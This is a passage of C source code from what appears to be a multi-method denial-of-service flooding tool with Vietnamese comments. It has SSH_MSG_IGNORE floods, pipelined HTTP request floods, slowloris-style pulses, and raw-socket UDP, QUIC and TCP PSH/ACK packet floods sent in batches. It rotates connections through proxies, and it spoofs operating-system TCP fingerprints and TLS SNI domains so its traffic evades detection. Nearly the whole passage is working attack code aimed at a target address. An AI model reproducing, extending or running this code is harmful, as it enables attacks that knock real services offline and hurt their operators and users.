                        if (now % 100 == 0) {
                            char junk = 0xFF;
                            send(conn->fd, &junk, 1, MSG_NOSIGNAL);
                        }
                    }
                }
            }
            
            else if (args.is_v11_chaos) {
                if (now - conn->last_pulse_ms >= 5) {
                    int cork = 1;
                    setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                    unsigned char chaos_buf[4096];
                    for(int i=0; i<4096; i++) chaos_buf[i] = fast_rand() % 256;
                    send(conn->fd, chaos_buf, 1400, MSG_NOSIGNAL | MSG_MORE);
                    send(conn->fd, chaos_buf + 512, 1400, MSG_NOSIGNAL | MSG_MORE);
                    send(conn->fd, chaos_buf + 1024, 1200, MSG_OOB | MSG_NOSIGNAL);
                    cork = 0;
                    setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                    thread_stats[thread_id].packets += 3;
                    thread_stats[thread_id].bytes += 4000;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v15_raw_amp || args.is_vn_tcp) {
                if (args.is_vn_tcp && conn->sub_stage == 0) {
                    // Step1: SSH banner
                    const char *ssh_banner = "SSH-2.0-OpenSSH_9.3p1 Ubuntu-1ubuntu3\r\n";
                    send(conn->fd, ssh_banner, strlen(ssh_banner), MSG_NOSIGNAL);
                    // Step2: minimal KEXINIT
                    unsigned char kexinit[256];
                    memset(kexinit, 0, sizeof(kexinit));
                    kexinit[0]=0x00;kexinit[1]=0x00;kexinit[2]=0x00;kexinit[3]=0xEC;
                    kexinit[4]=0x08;kexinit[5]=0x14;
                    for(int ki=6;ki<22;ki++) kexinit[ki]=(unsigned char)(fast_rand()&0xFF);
                    kexinit[22]=0x00;kexinit[23]=0x00;kexinit[24]=0x00;kexinit[25]=0x1F;
                    memcpy(kexinit+26,"curve25519-sha256,diffie-hellman-group14-sha256",31);
                    send(conn->fd, kexinit, sizeof(kexinit), MSG_NOSIGNAL);
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                }
                int ret = 0;
                if (args.is_vn_tcp) {
                    // SSH_MSG_IGNORE flood (RFC 4253 s11.2) - server MUST accept, no RST
                    // Packet: [4B pkt_len][1B pad=6][1B type=2][4B str_len][32700B data][6B pad]
                    #define VN_PL 32700
                    #define VN_SZ (4+1+1+4+VN_PL+6)
                    static __thread unsigned char vn_pkt[VN_SZ];
                    static __thread int vn_ok = 0;
                    if (!vn_ok) {
                        uint32_t pl = 1+1+4+VN_PL+6;
                        vn_pkt[0]=(pl>>24)&0xFF;vn_pkt[1]=(pl>>16)&0xFF;
                        vn_pkt[2]=(pl>>8)&0xFF; vn_pkt[3]=pl&0xFF;
                        vn_pkt[4]=6; vn_pkt[5]=2;
                        vn_pkt[6]=(VN_PL>>24)&0xFF;vn_pkt[7]=(VN_PL>>16)&0xFF;
                        vn_pkt[8]=(VN_PL>>8)&0xFF; vn_pkt[9]=VN_PL&0xFF;
                        for(int pi=10;pi<VN_SZ;pi++) vn_pkt[pi]=(unsigned char)(fast_rand()&0xFF);
                        vn_ok=1;
                    }
                    *((unsigned int*)(vn_pkt+10))=fast_rand();
                    while(1) {
                        ret=send(conn->fd,vn_pkt,VN_SZ,MSG_NOSIGNAL);
                        if(ret<=0){if(errno==EAGAIN||errno==EWOULDBLOCK)conn->writable=0;break;}
                        thread_stats[thread_id].packets++;
                        thread_stats[thread_id].tcp_packets++;
                        thread_stats[thread_id].bytes+=ret;
                    }
                } else {
                    while(1) {
                        int s=32768+(fast_rand()%32768);
                        int offset=fast_rand()%(BUFFER_POOL_SIZE-s);
                        ret=send(conn->fd,global_buffer_pool+offset,s,MSG_NOSIGNAL);
                        if(ret<=0){if(errno==EAGAIN||errno==EWOULDBLOCK)conn->writable=0;break;}
                        thread_stats[thread_id].packets++;
                        thread_stats[thread_id].tcp_packets++;
                        thread_stats[thread_id].bytes+=ret;
                    }
                }
                if(ret<=0 && errno!=EAGAIN && errno!=EWOULDBLOCK) goto cleanup;
            }
            
            else if (args.is_v7_pipe) {
                if (now - conn->last_pulse_ms >= 50 + conn->jitter_ms) { 
                    
                    
                    char pipe_buffer[16384] = {0};
                    int bp = 0;
                    int req_count = 0;
                    
                    
                    for (int i = 0; i < 80; i++) {
                        
                        int len = snprintf(pipe_buffer + bp, 16384 - bp, 
                            "GET /?rand=%d HTTP/1.1\r\n%s", 
                            fast_rand() % 999999, conn->randomized_headers);
                        bp += len;
                        req_count++;
                        if (bp >= 15800) break; 
                    }
                    
                    if (conn->ssl) SSL_write(conn->ssl, pipe_buffer, bp);
                    else {
                        int cork = 1;
                        setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                        send(conn->fd, pipe_buffer, bp, MSG_NOSIGNAL);
                        cork = 0;
                        setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                    }
                    
                    thread_stats[thread_id].packets += req_count;
                    thread_stats[thread_id].bytes += bp;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_crash_mode) {
                 if (now - conn->last_pulse_ms >= 5) { 
                     int s = 64 + (rand() % 128); 
                     
                     send(conn->fd, global_buffer_pool + (rand() % (BUFFER_POOL_SIZE - s)), s, MSG_NOSIGNAL);
                     thread_stats[thread_id].packets++;
                     conn->last_pulse_ms = now;
                 }
            }
            
            else if (now - conn->last_pulse_ms >= PULSE_INTERVAL_MS + conn->jitter_ms) {
                if (args.is_half_open) {
                    send(conn->fd, "\0", 1, MSG_NOSIGNAL); 
                } else {
                    int s = 512 + (rand() % 1024);
                    send(conn->fd, global_buffer_pool + (rand() % (BUFFER_POOL_SIZE - s)), s, MSG_NOSIGNAL);
                    thread_stats[thread_id].packets++;
                }
                conn->last_pulse_ms = now;
            }
        }
    }
    return;

cleanup:
    if (conn) {
        int socket_error = 0;
        socklen_t len = sizeof(socket_error);
        if (getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &socket_error, &len) == 0 && socket_error != 0) {
            errno = socket_error;
        }
        // Silenced to avoid performance bottlenecks caused by log spam under high stress rates
    }
    thread_stats[thread_id].connect_fail++;
    if (conn) {
        if (conn->prev) {
            conn->prev->next = conn->next;
        } else {
            active_conns_list = conn->next;
        }
        if (conn->next) {
            conn->next->prev = conn->prev;
        }

        if (conn->proxy) {
            __sync_fetch_and_add(&conn->proxy->fail_count, 1);
            conn->proxy->last_fail_time = get_ms();
            if (conn->proxy->fail_count >= 15) {
                conn->proxy->is_dead = 1;
            }
            if (conn->proxy->active_conns > 0) {
                __sync_fetch_and_sub(&conn->proxy->active_conns, 1);
                __sync_fetch_and_sub(&global_proxy_active_conns, 1);
            }
        } else {
            if (global_active_conns > 0) __sync_fetch_and_sub(&global_active_conns, 1);
        }
        if (conn->ssl) {
            SSL_free(conn->ssl);
        }
        if (conn->fd > 0) {
            close(conn->fd);
        }
        if (conn->client_udp_fd > 0) {
            close(conn->client_udp_fd);
        }
        free(conn);
    }
}

static int get_total_active_conns() {
    return global_active_conns + global_proxy_active_conns;
}

static Proxy *select_alive_proxy() {
    if (proxy_count <= 0) return NULL;
    long long now = get_ms();
    for (int attempt = 0; attempt < 20; attempt++) {
        int idx = rand() % proxy_count;
        Proxy *p = &proxies[idx];
        if (p->is_dead) {
            if (now - p->last_fail_time > 10000) {
                p->is_dead = 0;
                p->fail_count = 0;
            } else {
                continue;
            }
        }
        if (p->active_conns >= MAX_CONNS_PER_PROXY) continue;
        return p;
    }
    for (int i = 0; i < proxy_count; i++) {
        if (proxies[i].active_conns < MAX_CONNS_PER_PROXY && !proxies[i].is_dead) {
            return &proxies[i];
        }
    }
    return NULL;
}

int spawn_connection(int epoll_fd, int thread_id) {
    if (get_total_active_conns() >= args.rate) {
        return 0;
    }
    int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (fd == -1) return 0;

    int val = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &val, sizeof(val));
    
    int syn_retries = 4;
    setsockopt(fd, IPPROTO_TCP, TCP_SYNCNT, &syn_retries, sizeof(syn_retries));
    
    int ttl = 55 + (fast_rand() % 10);
    setsockopt(fd, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
    int mss = 536 + (fast_rand() % 925);
    setsockopt(fd, IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
    
    if (args.is_v15_raw_amp || args.is_vn_tcp) {
        int sndbuf = args.is_vn_tcp ? 4194304 : 1048576;
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    }
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    Proxy *p = NULL;
    int is_udp = 0;
    if (args.is_vn_tcp) {
        // VN method: prefer proxy, fallback to direct connect
        p = select_alive_proxy();
        // p = NULL → will connect directly to target
    } else if (args.is_hybrid_v15 && proxy_count > 0) {
        p = select_alive_proxy();
        if ((fast_rand() % 100) < 40) {
            is_udp = 1;
        }
    } else if (!args.is_v15_raw_amp || (fast_rand() % 100 < 30)) {
        p = select_alive_proxy();
    }
    
    if (!p && proxy_count > 0 && (!args.is_v15_raw_amp) && (!args.is_hybrid_v15) && (!args.is_vn_tcp)) {
        close(fd);
        return 0;
    }
    
    if (!p) {
        if (__sync_fetch_and_add(&global_active_conns, 0) >= args.rate) {
            close(fd);
            return 0;
        }
    }
    
    int target_port = args.port;
    if (args.is_v3_killer && num_open_ports > 0) {
        target_port = open_ports[rand() % num_open_ports];
    }

    if (p) {
        addr.sin_port = htons(p->port);
        inet_pton(AF_INET, p->host, &addr.sin_addr);
        __sync_fetch_and_add(&p->active_conns, 1);
        __sync_fetch_and_add(&global_proxy_active_conns, 1);
    } else {
        addr.sin_port = htons(target_port);
        inet_pton(AF_INET, args.target_ip, &addr.sin_addr);
        __sync_fetch_and_add(&global_active_conns, 1);
    }

    Connection *conn = calloc(1, sizeof(Connection));
    if (!conn) {
        if (p) { __sync_fetch_and_sub(&p->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
        else __sync_fetch_and_sub(&global_active_conns, 1);
        close(fd);
        return 0;
    }
    conn->fd = fd; conn->thread_id = thread_id; conn->proxy = p;
    conn->target_port = target_port;
    conn->stage = STAGE_CONNECTING;
    conn->writable = 0;
    conn->last_pulse_ms = get_ms();
    conn->jitter_ms = (rand() % 15) - 7;
    conn->is_udp_assoc = is_udp;
    conn->client_udp_fd = -1;
    if (!args.is_v15_raw_amp && !args.is_hybrid_v15) {
        generate_random_headers(conn->randomized_headers, conn->randomized_ua, args.host);
    }

    if (args.is_v14_phantom && !p) {
        unsigned char fastopen_data[] = "GET / HTTP/1.1\r\n\r\n";
        sendto(fd, fastopen_data, strlen((char*)fastopen_data), MSG_FASTOPEN, (struct sockaddr *)&addr, sizeof(addr));
    } else {
        int ret = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
        if (ret < 0 && errno != EINPROGRESS) {
            LOG_ERR("DEBUG connect() failed: fd=%d errno=%d (%s) target=%s:%d", fd, errno, strerror(errno), args.target_ip, target_port);
            close(fd);
            if (conn->proxy && conn->proxy->active_conns > 0) { __sync_fetch_and_sub(&conn->proxy->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
            if (!conn->proxy) __sync_fetch_and_sub(&global_active_conns, 1);
            free(conn);
            return 0;
        }
    }

    struct epoll_event ev = {EPOLLOUT | EPOLLIN | EPOLLET, {.ptr = conn}};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
        LOG_ERR("DEBUG epoll_ctl ADD failed: fd=%d errno=%d (%s)", fd, errno, strerror(errno));
        close(fd);
        if (conn->proxy && conn->proxy->active_conns > 0) { __sync_fetch_and_sub(&conn->proxy->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
        if (!conn->proxy) __sync_fetch_and_sub(&global_active_conns, 1);
        free(conn);
        return 0;
    }

    conn->next = active_conns_list;
    if (active_conns_list) {
        active_conns_list->prev = conn;
    }
    active_conns_list = conn;
    return 1;
}

/* ── Global stop flag for SIGINT/SIGTERM ── */
static volatile sig_atomic_t g_stop = 0;
static void _sig_stop_handler(int sig) { (void)sig; g_stop = 1; }

void *worker_thread(void *arg) {
    int tid = *(int *)arg; free(arg);
    
    unsigned int bin_target_ip = 0;
    inet_pton(AF_INET, args.target_ip, &bin_target_ip);
    unsigned short bin_target_port = htons(args.port);
    
    xorshift_init((unsigned int)(tid + 1) * 2654435761u + (unsigned int)time(NULL));
    

    if (args.is_v16_dns_amp || args.is_v18_quic) {
        int raw_fd = init_raw_socket();
        int udp_raw_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        LOG_INFO("T%d: stateless path entered, raw_fd=%d, udp_fd=%d, v18tls=%d", tid, raw_fd, udp_raw_fd, args.is_v18_tls);
        fflush(stdout); fflush(stderr);
        
        if (raw_fd >= 0) {
            int sndbuf = 64 * 1024 * 1024;
            setsockopt(raw_fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        }
        if (udp_raw_fd >= 0) {
            int sndbuf = 64 * 1024 * 1024;
            setsockopt(udp_raw_fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        }
        
        unsigned int cached_my_ip = get_local_ip();
        unsigned int cached_d_ip = bin_target_ip;
        struct sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(args.port);
        target_addr.sin_addr.s_addr = cached_d_ip;
        
        long long start_ms = get_ms();
        
        while (1) {
            if (args.is_v16_dns_amp) {
                #define V16_BATCH 64
                static __thread unsigned char raw_pkts_v16[V16_BATCH][1500] __attribute__((aligned(32)));
                static __thread struct mmsghdr msgs_v16[V16_BATCH];
                static __thread struct iovec iovs_v16[V16_BATCH];
                static __thread int mmsg_v16_inited = 0;
                static __thread unsigned int v16_udp_base_sum = 0;
                static __thread int v16_pkt_len = 0;
                
                if (!mmsg_v16_inited) {
                    int udp_payload_len = 1500 - sizeof(struct iphdr) - sizeof(struct udphdr);
                    v16_pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + udp_payload_len;
                    
                    unsigned char v16_tpl[1500] __attribute__((aligned(32)));
                    unsigned char udp_pay[1500];
                    for (int k = 0; k < udp_payload_len; k += 8) {
                        *((unsigned long long*)(udp_pay + k)) = 0xAAAAAAAAAAAAAAAAULL ^ (fast_rand() * 0x0101010101010101ULL);
                    }
                    int out_len = 0;
                    craft_udp_packet(v16_tpl, &out_len, cached_my_ip, cached_d_ip, 12345, args.port, udp_pay, udp_payload_len);
                    
                    struct iphdr *tiph = (struct iphdr *)v16_tpl;
                    struct udphdr *tudph = (struct udphdr *)(v16_tpl + sizeof(struct iphdr));
                    unsigned char *tpdata = v16_tpl + sizeof(struct iphdr) + sizeof(struct udphdr);
                    tudph->source = 0; tudph->check = 0;
                    
                    v16_udp_base_sum = 0;
                    v16_udp_base_sum += (tiph->saddr & 0xFFFF) + (tiph->saddr >> 16);
                    v16_udp_base_sum += (tiph->daddr & 0xFFFF) + (tiph->daddr >> 16);
                    v16_udp_base_sum += htons(IPPROTO_UDP);
                    v16_udp_base_sum += tudph->len;
                    v16_udp_base_sum += tudph->dest;
                    unsigned short *tps = (unsigned short *)tpdata;
                    for (int k = 0; k < udp_payload_len / 2; k++) v16_udp_base_sum += tps[k];
                    if (udp_payload_len % 2) v16_udp_base_sum += htons(((unsigned short)tpdata[udp_payload_len - 1]) << 8);
                    
                    for (int b = 0; b < V16_BATCH; b++) {
                        memcpy(raw_pkts_v16[b], v16_tpl, v16_pkt_len);
                        iovs_v16[b].iov_len = v16_pkt_len;
                        iovs_v16[b].iov_base = raw_pkts_v16[b];
                        msgs_v16[b].msg_hdr.msg_iov = &iovs_v16[b];
                        msgs_v16[b].msg_hdr.msg_iovlen = 1;
                        msgs_v16[b].msg_hdr.msg_name = &target_addr;
                        msgs_v16[b].msg_hdr.msg_namelen = sizeof(target_addr);
                    }
                    mmsg_v16_inited = 1;
                }
                
                for (int b = 0; b < V16_BATCH; b++) {
                    struct udphdr *udph = (struct udphdr *)(raw_pkts_v16[b] + sizeof(struct iphdr));
                    unsigned short sp = htons(1024 + (fast_rand() % 60000));
                    udph->source = sp;
                    unsigned int cs = v16_udp_base_sum + sp;
                    cs = (cs & 0xFFFF) + (cs >> 16); cs = (cs & 0xFFFF) + (cs >> 16);
                    udph->check = (unsigned short)~cs;
                    if (udph->check == 0) udph->check = 0xFFFF;
                }
                
                int sent_count = sendmmsg(raw_fd, msgs_v16, V16_BATCH, MSG_NOSIGNAL);
                if (sent_count > 0) {
                    for (int b = 0; b < sent_count; b++) {
                        thread_stats[tid].packets++;
                        thread_stats[tid].bytes += msgs_v16[b].msg_len;
                    }
                }
            } 
            else if (args.is_v18_quic) {
                #define V18Q_BATCH 64
                static __thread unsigned char quic_pkts[V18Q_BATCH][1500] __attribute__((aligned(32)));
                static __thread struct mmsghdr msgs_quic[V18Q_BATCH];
                static __thread struct iovec iovs_quic[V18Q_BATCH];
                static __thread int quic_inited = 0;
                static __thread int quic_pkt_len = 0;
                static __thread unsigned int quic_base_sum = 0;
                
                if (!quic_inited) {
                    int udp_payload_len = 1200; // QUIC typical initial packet size
                    quic_pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + udp_payload_len;
                    unsigned char qtpl[1500] __attribute__((aligned(32)));
                    unsigned char qpay[1500];
                    for(int i=0; i<udp_payload_len; i++) qpay[i] = fast_rand() & 0xFF;
                    qpay[0] = 0xC3; // QUIC Initial Header
                    *((unsigned int*)(qpay+1)) = htonl(0x00000001); // Version 1
                    qpay[5] = 0x08; // DCID Length
                    
                    int out_len = 0;
                    craft_udp_packet(qtpl, &out_len, cached_my_ip, cached_d_ip, 12345, args.port, qpay, udp_payload_len);
                    
                    struct iphdr *tiph = (struct iphdr *)qtpl;
                    struct udphdr *tudph = (struct udphdr *)(qtpl + sizeof(struct iphdr));
                    unsigned char *tpdata = qtpl + sizeof(struct iphdr) + sizeof(struct udphdr);
                    tudph->source = 0; tudph->check = 0;
                    
                    quic_base_sum = 0;
                    quic_base_sum += (tiph->saddr & 0xFFFF) + (tiph->saddr >> 16);
                    quic_base_sum += (tiph->daddr & 0xFFFF) + (tiph->daddr >> 16);
                    quic_base_sum += htons(IPPROTO_UDP);
                    quic_base_sum += tudph->len;
                    quic_base_sum += tudph->dest;
                    unsigned short *tps = (unsigned short *)tpdata;
                    for (int k = 0; k < udp_payload_len / 2; k++) quic_base_sum += tps[k];
                    if (udp_payload_len % 2) quic_base_sum += htons(((unsigned short)tpdata[udp_payload_len - 1]) << 8);
                    
                    for (int b = 0; b < V18Q_BATCH; b++) {
                        memcpy(quic_pkts[b], qtpl, quic_pkt_len);
                        iovs_quic[b].iov_len = quic_pkt_len;
                        iovs_quic[b].iov_base = quic_pkts[b];
                        msgs_quic[b].msg_hdr.msg_iov = &iovs_quic[b];
                        msgs_quic[b].msg_hdr.msg_iovlen = 1;
                        msgs_quic[b].msg_hdr.msg_name = &target_addr;
                        msgs_quic[b].msg_hdr.msg_namelen = sizeof(target_addr);
                    }
                    quic_inited = 1;
                }
                
                for (int b = 0; b < V18Q_BATCH; b++) {
                    struct udphdr *udph = (struct udphdr *)(quic_pkts[b] + sizeof(struct iphdr));
                    unsigned short sp = htons(1024 + (fast_rand() % 60000));
                    udph->source = sp;
                    // Randomize DCID
                    unsigned char *qdata = quic_pkts[b] + sizeof(struct iphdr) + sizeof(struct udphdr);
                    *((unsigned long long*)(qdata+6)) = fast_rand() * 0x0101010101010101ULL;
                    
                    unsigned int cs = quic_base_sum + sp;
                    cs = (cs & 0xFFFF) + (cs >> 16); cs = (cs & 0xFFFF) + (cs >> 16);
                    udph->check = (unsigned short)~cs;
                    if (udph->check == 0) udph->check = 0xFFFF;
                }
                
                int sent_count = sendmmsg(raw_fd, msgs_quic, V18Q_BATCH, MSG_NOSIGNAL);
                if (sent_count > 0) {
                    for (int b = 0; b < sent_count; b++) {
                        thread_stats[tid].packets++;
                        thread_stats[tid].bytes += msgs_quic[b].msg_len;
                    }
                }
            }
            else if (args.is_v18_tls) {
                #undef V18T_BATCH
                #define V18T_BATCH 256
                static __thread unsigned char tls_pkts[V18T_BATCH][1500] __attribute__((aligned(32)));
                static __thread struct mmsghdr msgs_tls[V18T_BATCH];
                static __thread struct iovec iovs_tls[V18T_BATCH];
                static __thread int tls_inited = 0;
                static __thread int tls_pkt_len = 0;
                static __thread unsigned int tls_base_sum = 0;
                static __thread unsigned int ip_base_sum = 0;
                
                if (!tls_inited) {
                    int tls_payload_len = 1460;
                    tls_pkt_len = sizeof(struct iphdr) + 20 + tls_payload_len;
                    unsigned char ttpl[1500] __attribute__((aligned(32)));
                    memset(ttpl, 0, sizeof(struct iphdr) + 20);
                    
                    // Build IP header
                    struct iphdr *tiph = (struct iphdr *)ttpl;
                    tiph->ihl = 5; tiph->version = 4;
                    tiph->tot_len = htons(tls_pkt_len);
                    tiph->frag_off = htons(0x4000);
                    tiph->ttl = 64;
                    tiph->protocol = IPPROTO_TCP;
                    tiph->saddr = cached_my_ip;
                    tiph->daddr = cached_d_ip;
                    
                    // Build TCP header — doff=5, PSH+ACK
                    struct tcphdr *ttcph = (struct tcphdr *)(ttpl + sizeof(struct iphdr));
                    ttcph->doff = 5;
                    ttcph->psh = 1; ttcph->ack = 1;
                    ttcph->dest = htons(args.port);
                    ttcph->window = htons(65535);
                    
                    // Build pure random payload (no TLS signature)
                    unsigned char *tpay = ttpl + sizeof(struct iphdr) + 20;
                    for(int i=0; i<tls_payload_len; i++) tpay[i] = fast_rand() & 0xFF;
                    
                    // Precompute IP checksum base (excluding id, ttl, check)
                    // IP header words: [0]=ver/ihl/tos, [1]=tot_len, [2]=id, [3]=frag, [4]=ttl/proto
                    //                  [5]=check, [6-7]=saddr, [8-9]=daddr
                    tiph->id = 0; tiph->ttl = 0; tiph->check = 0;
                    unsigned short *ipw = (unsigned short *)tiph;
                    ip_base_sum = ipw[0] + ipw[1] + ipw[3] + ipw[6] + ipw[7] + ipw[8] + ipw[9];
                    // Add protocol field (ttl=0, proto=TCP → htons(0x0006) but split across word[4])
                    ip_base_sum += htons(IPPROTO_TCP);  // word[4] with ttl=0
                    tiph->ttl = 64; // restore for template
                    
                    // TCP pseudo-header checksum base (excluding source, seq, ack_seq, check)
                    ttcph->source = 0; ttcph->seq = 0; ttcph->ack_seq = 0; ttcph->check = 0;
                    tls_base_sum = 0;
                    tls_base_sum += (tiph->saddr & 0xFFFF) + (tiph->saddr >> 16);
                    tls_base_sum += (tiph->daddr & 0xFFFF) + (tiph->daddr >> 16);
                    tls_base_sum += htons(IPPROTO_TCP);
                    tls_base_sum += htons(20 + tls_payload_len);
                    unsigned short *tps = (unsigned short *)(ttpl + sizeof(struct iphdr));
                    for (int k = 0; k < (20 + tls_payload_len) / 2; k++) tls_base_sum += tps[k];
                    
                    for (int b = 0; b < V18T_BATCH; b++) {
                        memcpy(tls_pkts[b], ttpl, tls_pkt_len);
                        iovs_tls[b].iov_len = tls_pkt_len;
                        iovs_tls[b].iov_base = tls_pkts[b];
                        msgs_tls[b].msg_hdr.msg_iov = &iovs_tls[b];
                        msgs_tls[b].msg_hdr.msg_iovlen = 1;
                        msgs_tls[b].msg_hdr.msg_name = &target_addr;
                        msgs_tls[b].msg_hdr.msg_namelen = sizeof(target_addr);
                    }
                    tls_inited = 1;
                    LOG_INFO("T%d: V18 TLS init OK, pkt_len=%d, raw_fd=%d", tid, tls_pkt_len, raw_fd);
                    fflush(stderr);
                }
                
                for (int b = 0; b < V18T_BATCH; b++) {
                    struct iphdr *iph = (struct iphdr *)tls_pkts[b];
                    struct tcphdr *tcph = (struct tcphdr *)(tls_pkts[b] + sizeof(struct iphdr));
                    
                    // Per-packet mutation: source port, seq, ack, IP ID
                    unsigned short sp = htons(1024 + (fast_rand() % 60000));
                    unsigned int seq = fast_rand();
                    unsigned int ack = fast_rand();
                    unsigned short new_id = htons(fast_rand() & 0xFFFF);
                    unsigned short ttl_val = 55 + (fast_rand() % 10);
                    
                    tcph->source = sp;
                    tcph->seq = htonl(seq);
                    tcph->ack_seq = htonl(ack);
                    iph->id = new_id;
                    iph->ttl = ttl_val;
                    
                    // Fast IP checksum: base + id + ttl_proto
                    unsigned int ic = ip_base_sum + new_id + htons((ttl_val << 8) | IPPROTO_TCP);
                    ic = (ic >> 16) + (ic & 0xFFFF); ic += (ic >> 16);
                    iph->check = (unsigned short)~ic;
                    
                    // Fast TCP checksum: base + source + seq + ack
                    unsigned int cs = tls_base_sum + sp;
                    cs += htons(seq >> 16); cs += htons(seq & 0xFFFF);
                    cs += htons(ack >> 16); cs += htons(ack & 0xFFFF);
                    cs = (cs >> 16) + (cs & 0xFFFF); cs += (cs >> 16);
                    tcph->check = (unsigned short)~cs;
                }
                
                int sent_count = sendmmsg(raw_fd, msgs_tls, V18T_BATCH, MSG_NOSIGNAL);
                if (sent_count > 0) {
                    for (int b = 0; b < sent_count; b++) {
                        thread_stats[tid].packets++;
                        thread_stats[tid].bytes += tls_pkt_len;
                    }
                } else if (sent_count < 0) {
                    if (errno == ENOBUFS || errno == EAGAIN) {
                        usleep(100);
                    }
                }
            }
        }
    }
    if (args.is_v17_tcp_bypass) {
        if (args.is_v17_safe_proxy) goto v17_safe_mode;

    /* ══════════════════════════════════════════════════════════════════════
     * PHẦN 0: PHÁT HIỆN MÔI TRƯỜNG — AUTO-DETECT
     * ══════════════════════════════════════════════════════════════════════ */
    int raw_cap = 0; /* 0=safe, 1=SOCK_RAW L3, 2=AF_PACKET L2 */
    if (geteuid() == 0) {
        int _t = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
        if (_t >= 0) { close(_t); raw_cap = 2; }
        else {
            _t = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
            if (_t >= 0) { close(_t); raw_cap = 1; }
        }
    }

    /* CPU affinity — ghim thread vào core */
    int _ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    { cpu_set_t _cs; CPU_ZERO(&_cs);
      CPU_SET((_ncpu > 1) ? (tid % (_ncpu-1))+1 : 0, &_cs);
      pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &_cs); }

    unsigned int src_ip = get_local_ip();
    if (!src_ip) { LOG_ERR("T%d: Không lấy được IP nguồn", tid); return NULL; }

    /* ══════════════════════════════════════════════════════════════════════
     * PHẦN 1: ĐỊNH NGHĨA CHUNG — OS PROFILES, TLS, HTTP/2
     * ══════════════════════════════════════════════════════════════════════ */

    /* --- 4 OS Profile cho TCP options SYN --- */
    /* Mỗi profile gồm: TTL, window, MSS, WScale, SACK_PERM, Timestamps */
    typedef struct {
        unsigned char ttl;
        unsigned short window;
        unsigned short mss;
        unsigned char wscale;
        unsigned char sack_perm; /* 1=có SACK Permitted */
        unsigned char has_ts;    /* 1=có Timestamp option */
        const char *name;
    } V17OsProfile;

    static const V17OsProfile v17_profiles[] = {
        /* Windows 10/11 — Chrome/Edge */
        { .ttl=128, .window=64240, .mss=1460, .wscale=8,
          .sack_perm=1, .has_ts=1, .name="Win10" },
        /* Linux 5.x/6.x — Chrome/Firefox */
        { .ttl=64,  .window=65535, .mss=1460, .wscale=7,
          .sack_perm=1, .has_ts=1, .name="Linux" },
        /* macOS 13+ — Safari/Chrome */
        { .ttl=64,  .window=65535, .mss=1460, .wscale=6,
          .sack_perm=1, .has_ts=1, .name="macOS" },
        /* iOS 16+ — Safari */
        { .ttl=64,  .window=65535, .mss=1400, .wscale=6,
          .sack_perm=1, .has_ts=0, .name="iOS" },
    };
    int n_profiles = sizeof(v17_profiles) / sizeof(v17_profiles[0]);

    /* --- Xây SYN packet với TCP options theo OS profile --- */
    /* Trả về tổng chiều dài TCP header (20 + options) */
    #define V17_BUILD_SYN_OPTS(opts_ptr, prof, ts_val, opt_total_len) do { \
        unsigned char *_op = (opts_ptr); int _p = 0; \
        /* MSS */ \
        _op[_p++]=2; _op[_p++]=4; \
        _op[_p++]=(prof).mss>>8; _op[_p++]=(prof).mss&0xFF; \
        if ((prof).sack_perm) { _op[_p++]=4; _op[_p++]=2; } /* SACK Permitted */ \
        if ((prof).has_ts) { \
            _op[_p++]=8; _op[_p++]=10; \
            unsigned int _tv=(ts_val); \
            _op[_p++]=(_tv>>24)&0xFF; _op[_p++]=(_tv>>16)&0xFF; \
            _op[_p++]=(_tv>>8)&0xFF;  _op[_p++]=_tv&0xFF; \
            _op[_p++]=0;_op[_p++]=0;_op[_p++]=0;_op[_p++]=0; \
        } \
        _op[_p++]=1; /* NOP */ \
        _op[_p++]=3; _op[_p++]=3; _op[_p++]=(prof).wscale; /* Window Scale */ \
        while (_p % 4 != 0) _op[_p++] = 0; /* Pad to 4-byte boundary */ \
        (opt_total_len) = _p; \
    } while(0)

    /* --- TLS ClientHello builder (Chrome 120+ JA3 fingerprint) --- */
    /* Xây dựng ClientHello TLS 1.2/1.3 hợp lệ với GREASE, SNI, extensions */
    /* Trả về chiều dài payload TLS */
    #define V17_MAX_CH_SIZE 600
    /* Macro inline vì không thể định nghĩa hàm trong hàm (C standard) */

    /* --- SNI domains cho TLS ClientHello --- */
    static const char *v17_sni_domains[] = {
        "www.google.com","api.cloudflare.com","cdn.jsdelivr.net",
        "static.cloudflareinsights.com","www.microsoft.com",
        "login.microsoftonline.com","api.github.com","www.amazon.com",
        "fonts.googleapis.com","ajax.googleapis.com",
        "www.youtube.com","accounts.google.com",
        "ssl.gstatic.com","www.gstatic.com",
        "www.facebook.com","edge.microsoft.com",
        "update.googleapis.com","clients1.google.com",
        "www.googleapis.com","storage.googleapis.com",
        "www.instagram.com","www.twitter.com",
        "cdnjs.cloudflare.com","unpkg.com",
